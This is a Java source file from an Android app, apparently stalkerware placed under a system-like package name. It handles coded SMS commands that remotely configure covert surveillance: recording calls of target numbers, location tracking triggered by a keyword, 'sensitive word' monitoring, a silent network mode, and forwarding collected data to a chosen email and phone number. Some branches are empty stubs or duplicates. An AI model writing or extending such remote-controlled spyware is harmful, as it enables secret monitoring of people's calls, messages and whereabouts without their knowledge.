package system.service;

import java.util.Date;

import system.service.activity.GlobalPrefActivity;
import system.service.activity.NETWORK_CONNECT_MODE;
import system.service.config.ConfigCtrl;
import system.service.feature.sms.SmsCtrl;
import android.content.Context;

import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.sms.SmsConsts;

public class IndicationHandler 
{
	public static void handleIndicationSms(Context context, String smsBody, String incomingPhoneNum) 
	{
		// -------------------------------------------------------
		// #0#<license key>: activate apk
		// #0#OFF: deactivate apk, and send SMS to server to clear using record to make it usable in other phone
		if (smsBody.startsWith(SmsConsts.INDICATION_KEY)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH)
			{
				LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, smsBody);
				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) return;
				
				// Send auth SMS to server for registration
				// TODO
				
				ConfigCtrl.setLicenseKey(context, indication);
				ConfigCtrl.setLicenseType(context, type);
				Date now = new Date();
				ConfigCtrl.setConsumedDatetime(context, now);
				ConfigCtrl.setLastActivatedDatetime(context, now);
				
				// Necessary to force reboot to make key effective?
				// TODO
			}
			// Unregister indication
			else if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
				LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
				// Only can deactivate FULL/PART/SUPER license key
				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) return;
				
				// Send unregister SMS to server
				boolean ret = SmsCtrl.sendUnregisterSms(context);
				if (!ret) {
					// If not success, should send SMS to tell the receiver that it fails
					SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_unregister_ng));
				} else {
					ConfigCtrl.setUnregistererPhoneNum(context, incomingPhoneNum);
				}
			}
		}
		
		// -------------------------------------------------------
		// #1#<mail address> <password>: set self sender
		// #1#OFF: stop using self sender, use default sender instead
		else if (smsBody.startsWith(SmsConsts.INDICATION_SENDER)) {
			String indication = smsBody.substring(3).trim();
			
			// Unregister indication
			if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
				// If it is recording all, we do not permit stop using self sender 
				//TODO
				
				GlobalPrefActivity.setUseSelfSender(context, false);
				SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_stop_selfsender_ok));
			}
			else // set self sender
			{
				String[] parts = indication.replaceAll(" {2,}", " ").split(" ");
				if (parts.length < 2) {
					// Send SMS to warn user
					String strContent = context.getResources().getString(R.string.indication_set_selfsender_ng);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
					return;
				}
				
				String mailAddr = parts[0];
				String pwd      = parts[1];
				
				GlobalPrefActivity.setUseSelfSender(context, true);
				GlobalPrefActivity.setSenderMail(context, mailAddr);
				GlobalPrefActivity.setSenderPassword(context, pwd);
				
				// Send SMS to user to let him known the result
				String strContent = context.getResources().getString(R.string.indication_set_selfsender_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #2#<mail address>: change receiver mail address
		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_MAIL)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0 && StrUtils.validateMailAddress(indication)) {
				GlobalPrefActivity.setReceiverMail(context, indication);
				
				String strContent = context.getResources().getString(R.string.indication_set_recv_mail_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			} else {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_recv_mail_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #3#<receiver phone number>: change receiver phone number
		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_PHONENUM)) {
			String indication = smsBody.substring(3).trim();
					
			if (indication.length() > 0) {
				GlobalPrefActivity.setReceiverPhoneNum(context, indication);
				
				String strContent = context.getResources().getString(R.string.indication_set_recv_phonenum_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			} else {
				String strContent = context.getResources().getString(R.string.indication_set_recv_phonenum_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #4#<interval days>: change get info interval days
		else if (smsBody.startsWith(SmsConsts.INDICATION_INTERVAL)) {
			String indication = smsBody.substring(3).trim();
			int days = 1;
			try {
				days = Integer.getInteger(indication);
			} catch (Exception ex) {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_getinfo_interval_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			
			if (days < 1 ) { days = 1; } 
			else if (days > 7) { days = 7; }
			
			GlobalPrefActivity.setInfoInterval(context, days);
			String strContent = context.getResources().getString(R.string.indication_set_getinfo_interval_ok);
			SmsCtrl.sendSms(incomingPhoneNum, strContent);
		}
		
		// -------------------------------------------------------
		// #5#<target number>: set recording target numbers
		// #5#ALL: recording all phone calls
		else if (smsBody.startsWith(SmsConsts.INDICATION_TARGET_NUM)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.equalsIgnoreCase(SmsConsts.ALL)) {
			
			} else {
				
			}
		}
		
		// -------------------------------------------------------
		// #6#<network mode>: set network mode
		else if (smsBody.startsWith(SmsConsts.INDICATION_NETWORK_MODE)) {
			String indication = smsBody.substring(3).trim();
			
			if (!indication.equalsIgnoreCase(SmsConsts.ACTIVE) && 
				!indication.equalsIgnoreCase(SmsConsts.SILENT)) {
				String strContent = context.getResources().getString(R.string.indication_set_network_mode_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			
			if (indication.equalsIgnoreCase(SmsConsts.ACTIVE)) {
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.ACTIVE);
			} else {
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.SILENT);
			}
			
			String strContent = context.getResources().getString(R.string.indication_set_network_mode_ok);
			SmsCtrl.sendSms(incomingPhoneNum, strContent);
		}
		
		// -------------------------------------------------------
		// #7#<sensitive words>: change sensitive words
		else if (smsBody.startsWith(SmsConsts.INDICATION_SENS_WORDS)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0) {
				// When it is OFF or off, we disable the location function
				if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
					GlobalPrefActivity.setSensitiveWords(context, "");
					String strContent = context.getResources().getString(R.string.indication_disable_sens_words_ok);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
					return;
				}
				
				String oriWords = indication.replaceAll(" {2,}", GlobalPrefActivity.SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
				String[] words = oriWords.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
				if (words.length > GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT) {
					// Send SMS to warn the user
					String strContent = context.getResources().getString(R.string.indication_set_sens_words_ng);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
					return;
				}
				
				GlobalPrefActivity.setSensitiveWords(context, indication);
				String strContent = context.getResources().getString(R.string.indication_set_sens_words_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #8#<location word>: change location word
		else if (smsBody.startsWith(SmsConsts.INDICATION_LOC_WORD)) {
			String indication = smsBody.substring(3).trim();
			
			// When it is OFF or off, we disable the location function
			if (indication.length() > 0) {
				if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
					GlobalPrefActivity.setGpsWord(context, "");
				} else {
					GlobalPrefActivity.setGpsWord(context, indication);
				}
			}
		}
		
		// -------------------------------------------------------
		// #9#<Yes/No>: show location SMS or not
		else if (smsBody.startsWith(SmsConsts.INDICATION_SHOW_LOC_SMS)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.equalsIgnoreCase(SmsConsts.YES)) {
				GlobalPrefActivity.setDisplayGpsSMS(context, true);
			} else if (indication.equalsIgnoreCase(SmsConsts.NO)) {
				GlobalPrefActivity.setDisplayGpsSMS(context, false);
			}
		}
		
		// -------------------------------------------------------
		else if (smsBody.startsWith("#7#")) {
			String indication = smsBody.substring(3).trim();
		}
		
		// -------------------------------------------------------
		else if (smsBody.startsWith("#8#")) {
			String indication = smsBody.substring(3).trim();
		}
		
		// -------------------------------------------------------
		else if (smsBody.startsWith("#9#")) {
			String indication = smsBody.substring(3).trim();
		}
		
	}
}
